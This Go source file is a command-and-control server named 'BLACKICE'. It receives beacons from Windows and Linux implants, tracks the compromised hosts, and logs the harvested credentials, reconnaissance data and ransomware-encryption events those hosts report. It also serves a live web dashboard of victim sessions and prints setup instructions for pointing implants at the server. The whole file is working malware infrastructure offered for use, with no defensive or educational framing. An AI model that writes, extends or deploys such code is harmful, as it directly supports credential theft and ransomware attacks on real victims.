package main

import (
  "encoding/json"
  "fmt"
  "io/ioutil"
  "net"
  "net/http"
  "os"
  "runtime"
  "sync"
  "time"
)

// BLACKICE C2 Server - Cross-Platform
// Receives beacons from Windows AND Linux implants

const (
  colorReset   = "\033[0m"
  colorCyan    = "\033[36m"
  colorYellow  = "\033[33m"
  colorRed     = "\033[31m"
  colorGreen   = "\033[32m"
  colorMagenta = "\033[95m"
)

type Session struct {
  SessionID   string                 `json:"session_id"`
  Hostname    string                 `json:"hostname"`
  Username    string                 `json:"username"`
  OS          string                 `json:"os"`
  Arch        string                 `json:"arch"`
  IPAddress   string                 `json:"ip_address"`
  FirstSeen   time.Time              `json:"first_seen"`
  LastSeen    time.Time              `json:"last_seen"`
  BeaconCount int                    `json:"beacon_count"`
  Status      string                 `json:"status"`
  Data        map[string]interface{} `json:"data"`
}

type BeaconRequest struct {
  SessionID string                 `json:"session_id"`
  Type      string                 `json:"type"`
  Hostname  string                 `json:"hostname"`
  Username  string                 `json:"username"`
  OS        string                 `json:"os"`
  Arch      string                 `json:"arch"`
  Timestamp int64                  `json:"timestamp"`
  Data      map[string]interface{} `json:"data"`
}

var (
  sessions = make(map[string]*Session)
  mutex    sync.RWMutex
  logFile  *os.File
)

func main() {
  printBanner()

  logFile, _ = os.OpenFile("blackice_c2_server.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
  defer logFile.Close()

  http.HandleFunc("/beacon", handleBeacon)
  http.HandleFunc("/sessions", handleSessions)
  http.HandleFunc("/", handleRoot)

  localIP := getLocalIP()

  fmt.Printf("\n%s[+] C2 SERVER STARTED%s\n", colorGreen, colorReset)
  fmt.Printf("%s[+] Platform:       %s/%s%s\n", colorCyan, runtime.GOOS, runtime.GOARCH, colorReset)
  fmt.Printf("%s[+] Listening:     0.0.0.0:8443%s\n", colorGreen, colorReset)
  fmt.Printf("%s[+] Your IP:      %s%s\n", colorCyan, localIP, colorReset)
  fmt.Printf("%s[+] Dashboard:   http://%s:8443/sessions%s\n\n", colorCyan, localIP, colorReset)

  fmt.Printf("%s╔════════════════════════════════════════════════╗%s\n", colorYellow, colorReset)
  fmt.Printf("%s║  Configure implant with:                        ║%s\n", colorYellow, colorReset)
  fmt.Printf("%s║  \"c2_server\": \"%s\"%-23s║%s\n", colorYellow, localIP, "", colorReset)
  fmt.Printf("%s╚════════════════════════════════════════════════╝%s\n\n", colorYellow, colorReset)

  fmt.Printf("%s[*] Waiting for implants... %s\n\n", colorYellow, colorReset)

  go sessionMonitor()

  http.ListenAndServe(":8443", nil)
}

func printBanner() {
  banner := `
    ██████╗ ██╗      █████╗  ██████╗██╗  ██╗██╗ ██████╗███████╗
    ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██║██╔════╝██╔════╝
    ██████╔╝██║     ███████║██║     █████╔╝ ██║██║     █████╗
    ██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ██║██║     ██╔══╝
    ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗██║╚██████╗███████╗
    ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝ ╚═════╝╚══════╝
         C2 Command & Control Server
`
  fmt.Printf("%s%s%s\n", colorMagenta, banner, colorReset)
}

func handleBeacon(w http.ResponseWriter, r *http.Request) {
  if r.Method != "POST" {
    http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
    return
  }

  body, _ := ioutil.ReadAll(r.Body)
  var beacon BeaconRequest

  if err := json.Unmarshal(body, &beacon); err != nil {
    http.Error(w, "Invalid JSON", http.StatusBadRequest)
    return
  }

  mutex.Lock()
  defer mutex.Unlock()

  session, exists := sessions[beacon.SessionID]

  if !exists {
    session = &Session{
      SessionID:   beacon.SessionID,
      Hostname:    beacon.Hostname,
      Username:    beacon.Username,
      OS:          beacon.OS,
      Arch:        beacon.Arch,
      IPAddress:   r.RemoteAddr,
      FirstSeen:   time.Now(),
      LastSeen:    time.Now(),
      BeaconCount: 1,
      Status:      "active",
      Data:        make(map[string]interface{}),
    }
    sessions[beacon.SessionID] = session

    osIcon := getOSIcon(beacon.OS)

    log(fmt.Sprintf("[NEW] %s | %s | %s@%s | %s", beacon.SessionID[:8], beacon.OS, beacon.Username, beacon.Hostname, r.RemoteAddr))

    fmt.Printf("%s[+] NEW IMPLANT %s%s\n", colorGreen, osIcon, colorReset)
    fmt.Printf("    ID:       %s\n", beacon.SessionID[:16]+"...")
    fmt.Printf("    OS:       %s%s %s%s\n", colorYellow, beacon.OS, beacon.Arch, colorReset)
    fmt.Printf("    Host:     %s\n", beacon.Hostname)
    fmt.Printf("    User:     %s\n", beacon.Username)
    fmt.Printf("    IP:        %s\n", r.RemoteAddr)
    fmt.Printf("    Type:     %s\n\n", beacon.Type)
  } else {
    session.LastSeen = time.Now()
    session.BeaconCount++
  }

  if beacon.Data != nil {
    for k, v := range beacon.Data {
      session.Data[k] = v
    }

    osIcon := getOSIcon(session.OS)

    switch beacon.Type {
    case "recon":
      log(fmt.Sprintf("[RECON] %s | %v", beacon.SessionID[:8], beacon.Data))
      fmt.Printf("%s[RECON] %s %s%s\n", colorCyan, osIcon, beacon.SessionID[:8], colorReset)

    case "credentials":
      log(fmt.Sprintf("[CREDS] %s | %v", beacon.SessionID[:8], beacon.Data))
      fmt.Printf("%s[CREDS] %s %s | Credentials harvested%s\n", colorRed, osIcon, beacon.SessionID[:8], colorReset)

    case "ransomware":
      log(fmt.Sprintf("[RANSOM] %s | %v", beacon.SessionID[:8], beacon.Data))
      fmt.Printf("%s[RANSOM] %s %s | Files encrypted%s\n", colorRed, osIcon, beacon.SessionID[:8], colorReset)

    case "heartbeat":
      fmt.Printf("%s[BEACON] %s %s | Count: %d%s\n", colorYellow, osIcon, beacon.SessionID[:8], session.BeaconCount, colorReset)
    }
  }

  w.Header().Set("Content-Type", "application/json")
  json.NewEncoder(w).Encode(map[string]interface{}{"status": "ok"})
}

func handleRoot(w http.ResponseWriter, r *http.Request) {
  fmt.Fprintf(w, "BLACKICE C2 Server - Online")
}

func handleSessions(w http.ResponseWriter, r *http.Request) {
  mutex.RLock()
  defer mutex.RUnlock()

  html := `<!DOCTYPE html>
<html>
<head>
    <title>BLACKICE C2</title>
    <style>
        body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
        h1 { color: #ff00ff; text-shadow: 0 0 10px #ff00ff; }
        .stats { color: #00ffff; margin: 20px 0; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { border: 1px solid #00ff00; padding: 10px; text-align: left; }
        th { background: #1a1a1a; color: #00ffff; }
        .windows { color: #0078d4; font-weight: bold; }
        .linux { color: #fcc624; font-weight: bold; }
        .darwin { color: #a2aaad; font-weight: bold; }
        .active { color: #00ff00; }
        .inactive { color: #ff0000; }
    </style>
    <meta http-equiv="refresh" content="5">
</head>
<body>
    <h1>⚡ BLACKICE C2 DASHBOARD ⚡</h1>
    <div class="stats">
        <p>Active Sessions: ` + fmt.Sprintf("%d", len(sessions)) + `</p>
        <p>Server OS: ` + runtime.GOOS + ` / ` + runtime.GOARCH + `</p>
    </div>
    <table>
        <tr>
            <th>Session</th>
            <th>OS</th>
            <th>Hostname</th>
            <th>Username</th>
            <th>IP</th>
            <th>First</th>
            <th>Last</th>
            <th>Beacons</th>
            <th>Status</th>
        </tr>`

  for _, s := range sessions {
    osClass := s.OS
    statusClass := "active"
    if s.Status != "active" {
      statusClass = "inactive"
    }

    html += fmt.Sprintf(`
        <tr>
            <td>%s</td>
            <td class="%s">%s %s</td>
            <td>%s</td>
            <td>%s</td>
            <td>%s</td>
            <td>%s</td>
            <td>%s</td>
            <td>%d</td>
            <td class="%s">%s</td>
        </tr>`,
      s.SessionID[:16],
      osClass,
      getOSIcon(s.OS),
      s.OS,
      s.Hostname,
      s.Username,
      s.IPAddress,
      s.FirstSeen.Format("15:04:05"),
      s.LastSeen.Format("15:04:05"),
      s.BeaconCount,
      statusClass,
      s.Status,
    )
  }

  html += `</table></body></html>`
  w.Write([]byte(html))
}

func sessionMonitor() {
  ticker := time.NewTicker(30 * time.Second)
  defer ticker.Stop()

  for range ticker.C {
    mutex.Lock()
    now := time.Now()

    for sessionID, session := range sessions {
      if now.Sub(session.LastSeen) > 2*time.Minute {
        if session.Status == "active" {
          session.Status = "inactive"
          log(fmt.Sprintf("[TIMEOUT] %s", sessionID[:8]))
          fmt.Printf("%s[! ] Session timeout: %s%s\n", colorYellow, sessionID[:8], colorReset)
        }
      }
    }
    mutex.Unlock()
  }
}

func getOSIcon(os string) string {
  switch os {
  case "windows":
    return "[WIN]"
  case "linux":
    return "[LIN]"
  case "darwin":
    return "[MAC]"
  default:
    return "[?]"
  }
}

func getLocalIP() string {
  addrs, err := net.InterfaceAddrs()
  if err != nil {
    return "127.0.0.1"
  }

  for _, addr := range addrs {
    if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
      if ipnet.IP.To4() != nil {
        return ipnet.IP.String()
      }
    }
  }
  return "127.0.0.1"
}

func log(msg string) {
  line := fmt.Sprintf("[%s] %s\n", time.Now().Format("15:04:05"), msg)
  if logFile != nil {
    logFile.WriteString(line)
  }
}
